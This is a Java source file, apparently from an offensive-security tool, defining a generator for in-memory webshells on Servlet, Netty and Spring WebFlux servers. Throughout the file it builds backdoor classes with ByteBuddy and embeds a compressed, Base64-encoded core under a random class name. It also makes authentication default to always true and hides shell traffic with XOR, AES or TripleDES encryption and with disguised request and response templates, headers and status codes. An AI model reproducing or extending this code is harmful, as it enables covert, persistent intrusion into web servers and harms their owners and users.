package com.reajason.noone.core.generator;

import com.reajason.javaweb.buddy.MethodCallReplaceVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.generator.ByteBuddyShellGenerator;
import com.reajason.javaweb.utils.CommonUtil;
import com.reajason.noone.core.NoOneCore;
import com.reajason.noone.core.generator.identifier.NettyHttpIdentifierVisitor;
import com.reajason.noone.core.generator.identifier.ReactorIdentifierVisitor;
import com.reajason.noone.core.generator.identifier.ServletIdentifierVisitor;
import com.reajason.noone.core.generator.protocol.HttpProtocolMetadata;
import com.reajason.noone.core.generator.protocol.ProtocolAdviceBindings;
import com.reajason.noone.core.generator.protocol.WrapResDataAdvice;
import com.reajason.noone.core.generator.protocol.netty.NettyGetArgFromContentBodyAdvice;
import com.reajason.noone.core.generator.protocol.netty.NettyGetArgFromContentFormUrlencodedAdvice;
import com.reajason.noone.core.generator.protocol.netty.NettyWrapResponseHeadersAdvice;
import com.reajason.noone.core.generator.protocol.netty.NettyWrapResponseStatusCodeAdvice;
import com.reajason.noone.core.generator.protocol.reactor.ReactorWrapResponseHeadersAdvice;
import com.reajason.noone.core.generator.protocol.reactor.ReactorWrapResponseStatusCodeAdvice;
import com.reajason.noone.core.generator.protocol.servlet.ServletGetArgFromRequestBodyAdvice;
import com.reajason.noone.core.generator.protocol.servlet.ServletGetArgFromRequestFormUrlencodedAdvice;
import com.reajason.noone.core.generator.protocol.servlet.ServletWrapResponseHeadersAdvice;
import com.reajason.noone.core.generator.protocol.servlet.ServletWrapResponseStatusCodeAdvice;
import com.reajason.noone.core.generator.transform.MethodInjectionVisitor;
import com.reajason.noone.core.generator.transform.MethodSig;
import com.reajason.noone.core.generator.transform.TransformDirection;
import com.reajason.noone.core.generator.transform.TransformPayloadImplementation;
import com.reajason.noone.core.transform.*;
import com.reajason.noone.server.profile.Profile;
import com.reajason.noone.server.profile.config.HttpProtocolConfig;
import com.reajason.noone.server.profile.config.HttpRequestBodyType;
import com.reajason.noone.server.profile.config.IdentifierConfig;
import com.reajason.noone.server.profile.config.ProtocolConfig;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FixedValue;
import org.apache.commons.lang3.StringUtils;

import java.util.Base64;
import java.util.HashSet;
import java.util.Set;

import static net.bytebuddy.matcher.ElementMatchers.*;

public class NoOneMemShellGenerator extends ByteBuddyShellGenerator<NoOneConfig> {
    public NoOneMemShellGenerator(ShellConfig shellConfig, NoOneConfig shellToolConfig) {
        super(shellConfig, shellToolConfig);
    }

    @Override
    protected DynamicType.Builder<?> getBuilder() {
        DynamicType.Builder<?> builder = new ByteBuddy().redefine(shellToolConfig.getShellClass());

        try (DynamicType.Unloaded<NoOneCore> unloaded = new ByteBuddy()
                .redefine(NoOneCore.class)
                .name(CommonUtil.generateClassName())
                .visit(TargetJreVersionVisitorWrapper.DEFAULT)
                .make()) {
            String coreGzipBase64 = Base64.getEncoder().encodeToString(CommonUtil.gzipCompress(unloaded.getBytes()));
            builder = builder.field(named("coreGzipBase64")).value(coreGzipBase64);
        }

        Profile profile = shellToolConfig.getProfile();
        if (profile == null) {
            return builder;
        }

        builder = applyIdentifierConfig(builder, profile.getIdentifier());

        ProtocolConfig protocolConfig = profile.getProtocolConfig();
        if (protocolConfig instanceof HttpProtocolConfig httpConfig) {
            builder = applyHttpProtocolConfig(builder, httpConfig);
        }

        builder = applyTransformers(builder, profile);

        return builder;
    }

    private DynamicType.Builder<?> applyIdentifierConfig(DynamicType.Builder<?> builder, IdentifierConfig identifier) {
        if (identifier != null) {
            var implementation = isReactorShell()
                    ? new ReactorIdentifierVisitor(identifier)
                    : isNettyHttpShell()
                    ? new NettyHttpIdentifierVisitor(identifier)
                    : new ServletIdentifierVisitor(identifier);
            return builder
                    .method(named("isAuthed")
                            .and(takesArguments(1))
                            .and(returns(boolean.class)))
                    .intercept(implementation);
        }

        return builder.method(named("isAuthed")).intercept(FixedValue.value(true));
    }

    private boolean isReactorShell() {
        return ShellType.SPRING_WEBFLUX_WEB_FILTER.equals(shellConfig.getShellType());
    }

    private boolean isNettyHttpShell() {
        return ShellType.NETTY_HANDLER.equals(shellConfig.getShellType());
    }

    private DynamicType.Builder<?> applyHttpProtocolConfig(
            DynamicType.Builder<?> builder,
            HttpProtocolConfig httpConfig
    ) {
        builder = applyGetArgFromRequest(builder, httpConfig);
        builder = applyWrapResData(builder, httpConfig);
        builder = applyWrapResponse(builder, httpConfig);
        return builder;
    }

    private DynamicType.Builder<?> applyTransformers(DynamicType.Builder<?> builder, Profile profile) {
        TransformationSpec request = TransformationSpec.parse(profile.getRequestTransformations());
        TransformationSpec response = TransformationSpec.parse(profile.getResponseTransformations());

        boolean requestEnabled = !isNone(request);
        boolean responseEnabled = !isNone(response);
        if (!requestEnabled && !responseEnabled) {
            return builder;
        }

        String password = profile.getPassword();
        String requestKeyBase64 = keyBase64(password, request.encryption());
        String responseKeyBase64 = keyBase64(password, response.encryption());

        Set<MethodSig> methods = new HashSet<>();
        if (requestEnabled) {
            collectRequiredMethods(methods, request, TransformDirection.INBOUND);
        }
        if (responseEnabled) {
            collectRequiredMethods(methods, response, TransformDirection.OUTBOUND);
        }

        if (requestEnabled) {
            builder = builder.method(named("transformReqPayload")
                            .and(takesArguments(byte[].class))
                            .and(returns(byte[].class)))
                    .intercept(new TransformPayloadImplementation(
                            TransformDirection.INBOUND,
                            request,
                            requestKeyBase64
                    ));
        }

        if (responseEnabled) {
            builder = builder.method(named("transformResData")
                            .and(takesArguments(byte[].class))
                            .and(returns(byte[].class)))
                    .intercept(new TransformPayloadImplementation(
                            TransformDirection.OUTBOUND,
                            response,
                            responseKeyBase64
                    ));
        }

        // Inject helper methods using ByteBuddy visitor
        if (!methods.isEmpty()) {
            builder = builder.visit(new MethodInjectionVisitor(TransformSupport.class, methods));
        }

        return builder;
    }

    private static boolean isNone(TransformationSpec spec) {
        if (spec == null) {
            return true;
        }
        return spec.compression() == CompressionAlgorithm.NONE
                && spec.encryption() == EncryptionAlgorithm.NONE
                && spec.encoding() == EncodingAlgorithm.NONE;
    }

    private static String keyBase64(String password, EncryptionAlgorithm algorithm) {
        if (algorithm == null || algorithm == EncryptionAlgorithm.NONE) {
            return "";
        }
        String context = switch (algorithm) {
            case XOR -> "XOR";
            case AES -> "AES";
            case TRIPLE_DES -> "TripleDES";
            case NONE -> "";
        };
        byte[] key = TransformSupport.deriveKey(password, context, algorithm.keyLengthBytes());
        return Base64.getEncoder().encodeToString(key);
    }

    private static void collectRequiredMethods(Set<MethodSig> out, TransformationSpec spec, TransformDirection direction) {
        CompressionAlgorithm compression = spec.compression();
        if (compression != null && compression != CompressionAlgorithm.NONE) {
            switch (compression) {
                case GZIP ->
                        out.add(new MethodSig(direction == TransformDirection.INBOUND ? "gzipDecompress" : "gzipCompress", "([B)[B"));
                case DEFLATE ->
                        out.add(new MethodSig(direction == TransformDirection.INBOUND ? "deflateDecompress" : "deflateCompress", "([B)[B"));
                case LZ4 ->
                        out.add(new MethodSig(direction == TransformDirection.INBOUND ? "lz4Decompress" : "lz4Compress", "([B)[B"));
            }
        }

        EncryptionAlgorithm encryption = spec.encryption();
        if (encryption != null && encryption != EncryptionAlgorithm.NONE) {
            switch (encryption) {
                case XOR -> out.add(new MethodSig("xor", "([B[B)[B"));
                case AES ->
                        out.add(new MethodSig(direction == TransformDirection.INBOUND ? "aesDecrypt" : "aesEncrypt", "([B[B)[B"));
                case TRIPLE_DES ->
                        out.add(new MethodSig(direction == TransformDirection.INBOUND ? "tripleDesDecrypt" : "tripleDesEncrypt", "([B[B)[B"));
            }
        }

        EncodingAlgorithm encoding = spec.encoding();
        if (encoding != null && encoding != EncodingAlgorithm.NONE) {
            switch (encoding) {
                case HEX ->
                        out.add(new MethodSig(direction == TransformDirection.INBOUND ? "decodeHex" : "encodeHex", "([B)[B"));
                case BIG_INTEGER ->
                        out.add(new MethodSig(direction == TransformDirection.INBOUND ? "decodeBigInteger" : "encodeBigInteger", "([B)[B"));
                case BASE64 -> {
                    out.add(new MethodSig(direction == TransformDirection.INBOUND ? "decodeBase64" : "encodeBase64", "([B)[B"));
                }
            }
        }
    }

    private DynamicType.Builder<?> applyGetArgFromRequest(DynamicType.Builder<?> builder, HttpProtocolConfig httpConfig) {
        if (isNettyHttpShell()) {
            return applyGetArgFromContent(builder, httpConfig);
        }

        HttpProtocolMetadata.PrefixSuffixIndexes requestIndexes = HttpProtocolMetadata.calculateRequestBodyIndexes(
                httpConfig.getRequestBodyType(),
                httpConfig.getRequestTemplate()
        );

        if (isReactorShell()) {
            int prefix = requestIndexes.prefixLength();
            int suffix = requestIndexes.suffixLength();
            builder = builder
                    .field(named("prefix")).value(prefix)
                    .field(named("suffix")).value(suffix);
            if (httpConfig.getRequestBodyType() == HttpRequestBodyType.FORM_URLENCODED) {
                String requestParameterName = HttpProtocolMetadata.extractParameterName(httpConfig.getRequestTemplate());
                builder = builder.field(named("paramName")).value(requestParameterName);
            }
            return builder;
        }

        var matcher = named("getArgFromRequest")
                .and(takesArguments(1))
                .and(returns(isReactorShell() ? reactor.core.publisher.Mono.class : byte[].class));

        Advice.WithCustomMapping mapping = Advice.withCustomMapping()
                .bind(ProtocolAdviceBindings.RequestPrefixLength.class, requestIndexes.prefixLength())
                .bind(ProtocolAdviceBindings.RequestSuffixLength.class, requestIndexes.suffixLength());

        if (httpConfig.getRequestBodyType() == HttpRequestBodyType.FORM_URLENCODED) {
            String requestParameterName = HttpProtocolMetadata.extractParameterName(httpConfig.getRequestTemplate());
            return builder.visit(mapping
                    .bind(ProtocolAdviceBindings.RequestParameterName.class, requestParameterName)
                    .to(ServletGetArgFromRequestFormUrlencodedAdvice.class)
                    .on(matcher));
        }
        return builder.visit(mapping
                .to(ServletGetArgFromRequestBodyAdvice.class)
                .on(matcher));
    }

    private DynamicType.Builder<?> applyGetArgFromContent(DynamicType.Builder<?> builder, HttpProtocolConfig httpConfig) {
        HttpProtocolMetadata.PrefixSuffixIndexes requestIndexes = HttpProtocolMetadata.calculateRequestBodyIndexes(
                httpConfig.getRequestBodyType(),
                httpConfig.getRequestTemplate()
        );

        var matcher = named("getArgFromContent")
                .and(takesArguments(byte[].class))
                .and(returns(byte[].class));

        Advice.WithCustomMapping mapping = Advice.withCustomMapping()
                .bind(ProtocolAdviceBindings.RequestPrefixLength.class, requestIndexes.prefixLength())
                .bind(ProtocolAdviceBindings.RequestSuffixLength.class, requestIndexes.suffixLength());

        if (httpConfig.getRequestBodyType() == HttpRequestBodyType.FORM_URLENCODED) {
            String requestParameterName = HttpProtocolMetadata.extractParameterName(httpConfig.getRequestTemplate());
            return builder.visit(mapping
                    .bind(ProtocolAdviceBindings.RequestParameterName.class, requestParameterName)
                    .to(NettyGetArgFromContentFormUrlencodedAdvice.class)
                    .on(matcher));
        }

        return builder.visit(mapping
                .to(NettyGetArgFromContentBodyAdvice.class)
                .on(matcher));
    }

    private DynamicType.Builder<?> applyWrapResData(
            DynamicType.Builder<?> builder,
            HttpProtocolConfig httpConfig
    ) {
        HttpProtocolMetadata.ResponsePrefixSuffix responseParts =
                HttpProtocolMetadata.calculateResponseParts(
                        httpConfig.getResponseBodyType(),
                        httpConfig.getResponseTemplate()
                );

        var matcher = named("wrapResData")
                .and(takesArguments(1))
                .and(returns(byte[].class));

        String prefixBase64 = Base64.getEncoder().encodeToString(responseParts.prefixBytes());
        String suffixBase64 = Base64.getEncoder().encodeToString(responseParts.suffixBytes());

        return builder
                .visit(MethodCallReplaceVisitorWrapper.newInstance(
                        "wrapResData", shellToolConfig.getShellClassName(), TransformSupport.class.getName()))
                .visit(Advice.withCustomMapping()
                        .bind(ProtocolAdviceBindings.ResponsePrefixBase64.class, prefixBase64)
                        .bind(ProtocolAdviceBindings.ResponseSuffixBase64.class, suffixBase64)
                        .to(WrapResDataAdvice.class)
                        .on(matcher));
    }

    private DynamicType.Builder<?> applyWrapResponse(DynamicType.Builder<?> builder, HttpProtocolConfig httpConfig) {
        var matcher = named("wrapResponse")
                .and(takesArguments(1))
                .and(returns(void.class));

        int statusCode = httpConfig.getResponseStatusCode();
        if (statusCode > 0) {
            Class<?> adviceClass = isReactorShell() ? ReactorWrapResponseStatusCodeAdvice.class
                    : isNettyHttpShell() ? NettyWrapResponseStatusCodeAdvice.class
                    : ServletWrapResponseStatusCodeAdvice.class;
            builder = builder.visit(Advice.withCustomMapping()
                    .bind(ProtocolAdviceBindings.ResponseStatusCode.class, statusCode)
                    .to(adviceClass)
                    .on(matcher));
        }
        String encodedHeaders = HttpProtocolMetadata.encodeHeaders(httpConfig.getResponseHeaders());
        if (StringUtils.isNoneBlank(encodedHeaders)) {
            Class<?> adviceClass = isReactorShell() ? ReactorWrapResponseHeadersAdvice.class
                    : isNettyHttpShell() ? NettyWrapResponseHeadersAdvice.class
                    : ServletWrapResponseHeadersAdvice.class;
            builder = builder.visit(Advice.withCustomMapping()
                    .bind(ProtocolAdviceBindings.ResponseEncodedHeaders.class, encodedHeaders)
                    .to(adviceClass)
                    .on(matcher));
        }
        return builder;
    }
}
